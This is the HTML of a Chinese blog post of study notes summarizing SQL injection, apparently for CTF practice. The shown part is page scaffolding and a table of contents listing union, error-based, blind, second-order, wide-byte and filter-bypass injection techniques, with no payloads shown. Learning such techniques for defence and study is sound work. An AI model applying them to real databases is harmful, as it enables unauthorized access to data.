<!DOCTYPE html>
<html lang=en>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="renderer" content="webkit">
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="format-detection" content="telephone=no,email=no,adress=no">
  <!-- Color theme for statusbar -->
  <meta name="theme-color" content="#000000" />
  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
  <meta http-equiv="window-target" content="_top" />
  
  
  <title>SQL注入总结 | chickenmushroom&#39;s blog</title>
  <meta name="description" content="SQL注入大纲  1.基础知识1.1 字符串截取函数1left(str,index)&#x2F;&#x2F;从左边第index开始截取  select left(“abcdef”,3) &#x3D;&#x3D;&#x3D;&gt; “abc” 1right(str,index) &#x2F;&#x2F;从右边第index开始截取  select right(“abcdef”,3) &#x3D;&#x3D;&#x3D;&gt;”def” 1substring(str,pos)&#x2F;&#x2F;从左边第pos个字">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入总结">
<meta property="og:url" content="http://example.com/2021/11/15/SQL%E6%B3%A8%E5%85%A5/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="SQL注入大纲  1.基础知识1.1 字符串截取函数1left(str,index)&#x2F;&#x2F;从左边第index开始截取  select left(“abcdef”,3) &#x3D;&#x3D;&#x3D;&gt; “abc” 1right(str,index) &#x2F;&#x2F;从右边第index开始截取  select right(“abcdef”,3) &#x3D;&#x3D;&#x3D;&gt;”def” 1substring(str,pos)&#x2F;&#x2F;从左边第pos个字">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/sql.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/20190308213822172.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210525180604257.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210525180635545.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210525231520468.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210428224528059.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210428224616428.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210428225720126.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210526231034204.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210526231153417.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210526231306027.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210526231406468.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210526231546085.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210526232016283.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210526232649156.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210526233121086.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210526233504853.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210527224444135.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210527225514945.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210529223322334.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210529223345008.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210529223356929.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210529223743912.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210530220913466.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210530222841975.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210530222854481.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210530223246417.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210530223314693.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607230340082.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607230436289.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607230545764.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607230736077.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607230959573.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607231326126.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607231456157.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607231617459.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607232717376.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607232850067.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/doubleinject.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607224627291.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607224639404.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607225002602.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210607225254115.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/20181129094720958.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/2018112909594722.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/20181129100730219.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210612181348741.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210612181741154.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210612181834709.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210612223126749.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210613170724973.png">
<meta property="og:image" content="https://blog.cfyqy.com/images/loopholes/sql/6.png">
<meta property="og:image" content="https://blog.cfyqy.com/images/loopholes/sql/7.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210613173053219.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210613173307062.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210613174056076.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210613174425167.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210617163910699.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210617222422291.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210617222507272.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210617223154087.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210617223351048.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210617223411851.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210617223440178.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210617224806361.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210617224920523.png">
<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20210617225037128.png">
<meta property="article:published_time" content="2021-11-14T16:00:00.000Z">
<meta property="article:modified_time" content="2021-11-16T00:24:01.542Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="学习笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://cr_7.gitee.io/git-hub-image/sql.png">
  <!-- Canonical links -->
  <link rel="canonical" href="http://example.com/2021/11/15/SQL%E6%B3%A8%E5%85%A5/index.html">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png" type="image/x-icon">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  
  
  
<meta name="generator" content="Hexo 5.4.0"></head>


<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
  <div class="slimContent">
    <div class="navbar-header">
      
      
      <div class="profile-block text-center">
        <a id="avatar" href="https://github.com/cofess" target="_blank">
          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
        </a>
        <h2 id="name" class="hidden-xs hidden-sm">chickenmushroom</h2>
        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Web</h3>
        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Guangzhou, China</small>
      </div>
      
      <div class="search" id="search-form-wrap">

    <form class="search-form sidebar-form">
        <div class="input-group">
            <input type="text" class="search-form-input form-control" placeholder="Search" />
            <span class="input-group-btn">
                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
            </span>
        </div>
    </form>
    <div class="ins-search">
  <div class="ins-search-mask"></div>
  <div class="ins-search-container">
    <div class="ins-input-wrapper">
      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
    </div>
    <div class="ins-section-wrapper">
      <div class="ins-section-container"></div>
    </div>
  </div>
</div>


</div>
      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
    </div>
    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
      <ul class="nav navbar-nav main-nav ">
        
        
        <li class="menu-item menu-item-home">
          <a href="/.">
            
            <i class="icon icon-home-fill"></i>
            
            <span class="menu-title">Home</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-archives">
          <a href="/archives">
            
            <i class="icon icon-archives-fill"></i>
            
            <span class="menu-title">Archives</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-categories">
          <a href="/categories">
            
            <i class="icon icon-folder"></i>
            
            <span class="menu-title">Categories</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-tags">
          <a href="/tags">
            
            <i class="icon icon-tags"></i>
            
            <span class="menu-title">Tags</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-repository">
          <a href="/repository">
            
            <i class="icon icon-project"></i>
            
            <span class="menu-title">Repository</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-books">
          <a href="/books">
            
            <i class="icon icon-book-fill"></i>
            
            <span class="menu-title">Books</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-links">
          <a href="/links">
            
            <i class="icon icon-friendship"></i>
            
            <span class="menu-title">Links</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-about">
          <a href="/about">
            
            <i class="icon icon-cup-fill"></i>
            
            <span class="menu-title">About</span>
          </a>
        </li>
        
      </ul>
      
	
    <ul class="social-links">
    	
        <li><a href="/null" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
        
        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
        
        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
        
        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
        
        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
        
    </ul>

    </nav>
  </div>
</header>

  
    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    
      <div class="widget">
    <h3 class="widget-title">Board</h3>
    <div class="widget-body">
        <div id="board">
            <div class="content">
                <p>欢迎交流与分享经验!</p>
            </div>
        </div>
    </div>
</div>

    
      

    
      
  <div class="widget">
    <h3 class="widget-title">Tags</h3>
    <div class="widget-body">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/" rel="tag">PHP小项目</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WriteUp/" rel="tag">WriteUp</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a><span class="tag-list-count">15</span></li></ul>
    </div>
  </div>


    
      
  <div class="widget">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget-body tagcloud">
      <a href="/tags/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/" style="font-size: 13px;">PHP小项目</a> <a href="/tags/WriteUp/" style="font-size: 13.5px;">WriteUp</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 14px;">学习笔记</a>
    </div>
  </div>

    
      
  <div class="widget">
    <h3 class="widget-title">Archive</h3>
    <div class="widget-body">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">2</span></li></ul>
    </div>
  </div>


    
      
  <div class="widget">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget-body">
      <ul class="recent-post-list list-unstyled no-thumbnail">
        
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                
              </p>
              <p class="item-title">
                <a href="/2021/11/15/ciscn2021%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA/" class="title">ciscn2021半决赛-华南赛区</a>
              </p>
              <p class="item-date">
                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                
              </p>
              <p class="item-title">
                <a href="/2021/11/15/ciscn2021%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%A2%84%E8%B5%9B/" class="title">ciscn2021华南赛区预赛</a>
              </p>
              <p class="item-date">
                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                
              </p>
              <p class="item-title">
                <a href="/2021/11/15/SQL%E6%B3%A8%E5%85%A5/" class="title">SQL注入总结</a>
              </p>
              <p class="item-date">
                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                
              </p>
              <p class="item-title">
                <a href="/2021/11/15/docker%E5%85%A5%E9%97%A8%E5%88%B0%E9%83%A8%E7%BD%B2/" class="title">docker入门到部署</a>
              </p>
              <p class="item-date">
                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
              </p>
            </div>
          </li>
          
          <li>
            
            <div class="item-inner">
              <p class="item-category">
                
              </p>
              <p class="item-title">
                <a href="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8Bweb%E5%92%8Cmisc/" class="title">攻防世界新手web和misc</a>
              </p>
              <p class="item-date">
                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
              </p>
            </div>
          </li>
          
      </ul>
    </div>
  </div>
  

    
  </div>
</aside>

  
  
<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    <nav id="toc" class="article-toc">
      <h3 class="toc-title">Catalogue</h3>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text">1.基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E5%8F%96%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1 字符串截取函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%AF%94%E8%BE%83%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2 字符串比较函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">1.3字符串连接函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BD%95%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.4.</span> <span class="toc-text">1.4一些绕过注入的罕见函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5mysql%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.5.</span> <span class="toc-text">1.5mysql中一些基础函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">1.1.6.</span> <span class="toc-text">1.6注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-7%E6%93%8D%E4%BD%9C%E7%AC%A6%E5%8F%B7"><span class="toc-number">1.1.7.</span> <span class="toc-text">1.7操作符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-8%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.1.8.</span> <span class="toc-text">1.8运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-9%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.9.</span> <span class="toc-text">1.9常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-10-information-schema"><span class="toc-number">1.1.10.</span> <span class="toc-text">1.10 information_schema</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-11-MySQL%E4%B8%AD%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6"><span class="toc-number">1.1.11.</span> <span class="toc-text">1.11 MySQL中的空白字符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.</span> <span class="toc-text">2.注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1%E6%95%B0%E5%80%BC%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1数值型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3union联合查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.2.4.</span> <span class="toc-text">2.3 堆叠查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%AE%9A%E4%B9%89"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">0x01 堆叠注入定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">0x02 原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E5%BC%BA%E7%BD%91%E6%9D%AF%E4%BE%8B%E9%A2%98"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">0x03 强网杯例题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.5.</span> <span class="toc-text">2.4报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0X01-floor-%E5%92%8Crand"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">0X01 floor()和rand()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0X02-XPATH%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">0X02 XPATH语法错误</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ExtractValue-%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6-%E6%9C%80%E9%95%BF32%E4%BD%8D"><span class="toc-number">1.2.5.2.1.</span> <span class="toc-text">ExtractValue(有长度限制,最长32位)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#UpdateXml-%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6-%E6%9C%80%E9%95%BF32%E4%BD%8D"><span class="toc-number">1.2.5.2.2.</span> <span class="toc-text">UpdateXml(有长度限制,最长32位)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x03-%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7%E6%8A%A5%E9%94%99"><span class="toc-number">1.2.5.2.3.</span> <span class="toc-text">0x03 函数特性报错</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.6.</span> <span class="toc-text">2.5 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">0x01布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">0x02报错注入盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.6.3.</span> <span class="toc-text">0x03时间盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04order-by%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.6.4.</span> <span class="toc-text">0x04order by盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.7.</span> <span class="toc-text">3.注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">3.1无列名注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01order-by"><span class="toc-number">1.2.7.1.1.</span> <span class="toc-text">0x01order by</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02%E4%B8%8D%E4%BD%BF%E7%94%A8%E5%88%97%E5%90%8D%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.2.7.1.2.</span> <span class="toc-text">0x02不使用列名查询</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x03union%E8%A2%AB%E9%99%90%E5%88%B6"><span class="toc-number">1.2.7.1.3.</span> <span class="toc-text">0x03union被限制</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">3.2二次注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-insert%E3%80%81update%E5%92%8Cdelete%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.7.3.</span> <span class="toc-text">3.3 insert、update和delete报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x1%E4%BD%BF%E7%94%A8updatexml-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.3.1.</span> <span class="toc-text">0x1使用updatexml()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x1-2%E4%BD%BF%E7%94%A8extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.3.2.</span> <span class="toc-text">0x1.2使用extractvalue()函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x3%E4%BD%BF%E7%94%A8name-const-%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.3.3.</span> <span class="toc-text">0x3使用name_const()函数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.7.4.</span> <span class="toc-text">3.4宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.7.5.</span> <span class="toc-text">3.5笛卡尔积注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-6MySQL%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.7.6.</span> <span class="toc-text">3.6MySQL约束攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-7-limit%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.7.7.</span> <span class="toc-text">3.7 limit注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x1-%E4%B8%8D%E5%AD%98%E5%9C%A8-order-by-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.2.7.7.1.</span> <span class="toc-text">0x1 不存在 order by 关键字</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x2-%E5%AD%98%E5%9C%A8order-by%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.2.7.7.2.</span> <span class="toc-text">0x2 存在order by关键字</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-7-MD5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.7.8.</span> <span class="toc-text">3.7 MD5注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-8-LIKE%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.7.9.</span> <span class="toc-text">3.8 LIKE注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-9-mysql8%E6%96%B0%E7%89%B9%E6%80%A7%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.7.10.</span> <span class="toc-text">3.9 mysql8新特性注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-mysql8%E8%AF%AD%E6%B3%95%E6%96%B0%E7%89%B9%E5%BE%81"><span class="toc-number">1.2.7.10.1.</span> <span class="toc-text">0x01 mysql8语法新特征</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8MySQL8%E6%96%B0%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87select"><span class="toc-number">1.2.7.10.2.</span> <span class="toc-text">0x02 利用MySQL8新特性绕过select</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-10-handler"><span class="toc-number">1.2.7.11.</span> <span class="toc-text">3.10 handler</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">4.sql注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.3.1.</span> <span class="toc-text">4.1 过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span 